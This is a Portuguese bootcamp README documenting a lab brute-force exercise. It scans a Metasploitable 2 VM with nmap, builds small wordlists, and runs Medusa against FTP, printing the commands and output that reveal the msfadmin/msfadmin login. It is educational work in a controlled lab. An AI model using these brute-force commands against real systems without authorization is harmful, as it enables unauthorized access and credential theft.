# Desafio-Ataque-de-Brute-Force-de-Senhas-Medusa-e-Kali-Linux
Desafio Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux do Bootcamp Santander Cibersegurança 2025

## Projeto DIO — Auditoria de Força Bruta (Kali + Medusa)
Visão Geral

Este projeto documenta a montagem de um ambiente controlado (Kali Linux + Metasploitable 2 + DVWA) e a execução de testes de força bruta utilizando a ferramenta Medusa para fins educacionais.
Objetivos: entender técnicas de brute force em FTP, formulário web e SMB; criar wordlists simples; validar acessos e sugerir mitigação.

⚠️ Este projeto foi executado em ambiente controlado (VMs próprias). Não realize esses testes em sistemas sem autorização explícita.

## Ambiente
- Host: VirtualBox

- VMs:
  - Kali Linux (atacante)
  -Metasploitable 2 (alvo) — serviços: FTP, SMB, DVWA (web)

- Rede: Host-only / Internal Network (ambas as VMs na mesma rede privada)

- IPs:
  - Kali: 192.168.56.101
  - Metasploitable 2: 192.168.56.101

## Ferramentas utilizadas

- Kali Linux

- Medusa

- DVWA

- Metasploitable 2

- Wordlists

# Procedimentos e Comandos:

1. Configurando as VM's:

1.1 Baixe as ISO's nos seguintes links:
- Kali Linux: 
  - https://www.kali.org/get-kali/#kali-platforms (Faça o Download pela opção do VirtualBox)

- Metasploitable 2:
  - https://sourceforge.net/projects/metasploitable/files/Metasploitable2/ (Faça o Download da versão mais recente)

Após os downloads, criar as VM's dentro do VirtualBox com as respectivas ISO's e configurar a rede delas como "Host-only / Internal Network", para o funcionamento do teste.

2. Auditoria

2.1 Enumeração
````
nmap -sV -p 21,22,80,445,139 192.168.56.101
````
- No primeiro passo da Auditoria, precisamos enumerar quais portas estão abertas no IP do alvo, e pra isso utilizamos o comando "nmap" seguido dos parâmetros "-sV" (versões dos serviços) e "-p" (para verificar as portas dos serviços, que no nosso caso, utilizamos portas comuns) e por último o IP.

Saída de comando
````
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p 21,22,80,445,139 192.168.56.101 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-15 21:51 EDT
Nmap scan report for 192.168.56.101
Host is up (0.0013s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 08:00:27:34:A3:05 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.69 seconds
````
O foco do desafio está na porta 21 que seria referente ao serviço FTP que está aberto.

Para testarmos se conseguimos conexão com o serviço, digitamos o seguinte comando:
````
ftp 192.168.56.101 
````
Saída:
````
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.56.101
Connected to 192.168.56.101.
220 (vsFTPd 2.3.4)
Name (192.168.56.101:kali):
````
Aqui ele pede que informemos o usuário e senha. Como não sabemos, precisamos utilizar o Medusa para testar nomes de usuários e senhas por meio de wordlists. E pra isso utilizamos:
> Wordlist usuários
```
echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt  
```
> Wordlist senhas
```
echo -e '123456\npassword\nqwerty\nmsfadmin' > pass.txt
```

Com as wordlists criadas, podemos iniciar o ataque com o Medusa.

```
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
```

Saída
```
┌──(kali㉿kali)-[~]
└─$ medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2025-10-15 22:41:12 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: password (1 of 4 complete)
2025-10-15 22:41:12 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: msfadmin (1 of 4 complete)
2025-10-15 22:41:12 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: 123456 (2 of 4 complete)
2025-10-15 22:41:12 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: msfadmin (3 of 4 complete)
2025-10-15 22:41:12 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
2025-10-15 22:41:13 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: 123456 (2 of 4 complete)
2025-10-15 22:41:13 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: password (3 of 4 complete)
2025-10-15 22:41:13 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: qwerty (4 of 4 complete)
2025-10-15 22:41:15 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 4 complete) Password: qwerty (4 of 4 complete)
2025-10-15 22:41:15 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: 123456 (1 of 4 complete)
2025-10-15 22:41:15 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: password (2 of 4 complete)
2025-10-15 22:41:16 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: 123456 (1 of 4 complete)
2025-10-15 22:41:16 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: qwerty (3 of 4 complete)
2025-10-15 22:41:16 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: msfadmin (4 of 4 complete)
2025-10-15 22:41:18 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: password (2 of 4 complete)
2025-10-15 22:41:18 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: qwerty (3 of 4 complete)
2025-10-15 22:41:18 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: msfadmin (4 of 4 complete)
```

Percebe-se que na linha 5 da saída do código obtivemos um sucesso, onde ele nos retorna com o usuário: msfadmin e senha: msfadmin. Com isso podemos fazer o teste no comando "ftp", que irá nos apresentar a seguinte saída:

```
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.56.101
Connected to 192.168.56.101.
220 (vsFTPd 2.3.4)
Name (192.168.56.101:kali): msfadmin
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

```

